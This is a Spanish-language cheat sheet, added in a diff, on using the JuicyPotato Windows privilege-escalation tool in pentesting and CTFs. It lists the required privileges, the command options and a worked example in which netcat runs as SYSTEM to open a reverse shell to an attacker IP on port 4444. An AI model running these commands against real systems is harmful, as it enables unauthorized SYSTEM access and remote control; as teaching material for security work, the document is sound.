@@ -1,0 +1,74 @@
+JuicyPotato es una herramienta de explotación en Windows que permite a un atacante elevar privilegios desde un usuario con permisos bajos a SYSTEM aprovechando 
+ciertas configuraciones de DCOM y COM Service.
+
+Forma parte de la familia de los “Potato Exploits” (RottenPotato, RottenPotatoNG, SweetPotato, PrintSpoofer, etc.), que se usan en Windows privilege escalation.
+
+
+¿Para qué se usa?
+
+    > Escalación de privilegios locales en Windows
+	
+        Si tienes acceso a un sistema como un usuario con pocos permisos pero puedes ejecutar procesos con SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege, 
+		puedes usar JuicyPotato para ejecutar comandos como NT AUTHORITY\SYSTEM (máximo nivel en Windows).
+    
+    > Post-explotación en pentesting / CTFs
+    
+	    Muchas veces, tras comprometer una máquina, se logra acceso como un usuario normal, y JuicyPotato ayuda a conseguir control total.
+
+
+Requisitos
+
+    > Windows Vista → Windows 10 (algunas versiones parcheadas).
+    
+    > Tener habilitados privilegios:
+    
+        - SeImpersonatePrivilege
+        - o SeAssignPrimaryTokenPrivilege
+    
+    Puedes comprobarlos con:
+    
+        whoami /priv
+    
+    Si alguno aparece como Enabled, JuicyPotato puede funcionar.
+    
+
+Opciones y uso
+
+    JuicyPotato.exe -t * -p "cmd.exe" -a "/c whoami > C:\Temp\out.txt" -l 1337
+
+    -------------------------------------------------------------------------------------------------------
+    |  Opción  |  Descripción                                                                             |
+    -------------------------------------------------------------------------------------------------------
+    |  -t      |  Tipo de CLSID a usar (* = automático).                                                  |
+    |  -p      |  Programa a ejecutar con privilegios SYSTEM (ejemplo: cmd.exe, nc.exe, powershell.exe).  |
+    |  -a      |  Argumentos a pasar al programa (/c whoami, -e cmd.exe, etc.).                           |
+    |  -l      |  Puerto de escucha RPC local (ejemplo: 1337).                                            |
+    |  -c      |  CLSID específico si se quiere usar manualmente (base de objetos COM/DCOM).              |
+    |  -k      |  Indica tipo de explotación a usar (potato attack method).                               |
+    -------------------------------------------------------------------------------------------------------
+	
+
+Ejemplo práctico (reverse shell con netcat)
+
+    Supongamos que tienes un nc.exe en C:\Temp\ y quieres que se ejecute como SYSTEM:
+
+          JuicyPotato.exe -t * -p C:\Temp\nc.exe -a "10.10.14.25 4444 -e cmd.exe" -l 1337
+
+    Esto abrirá una reverse shell con permisos SYSTEM hacia tu máquina atacante.	
+	
+	
+Notas importantes
+
+    > JuicyPotato ya no funciona en las últimas versiones de Windows (a partir de Windows Server 2019 y Windows 10 parcheado).
+  
+    > Alternativas más nuevas:
+
+          - PrintSpoofer
+          - RoguePotato
+          - SweetPotato
+
+
+En resumen
+
+    JuicyPotato = herramienta de escalación de privilegios en Windows, usada en pentesting y CTFs para pasar de usuario limitado a SYSTEM, siempre que los privilegios 
+    SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege estén habilitados.	
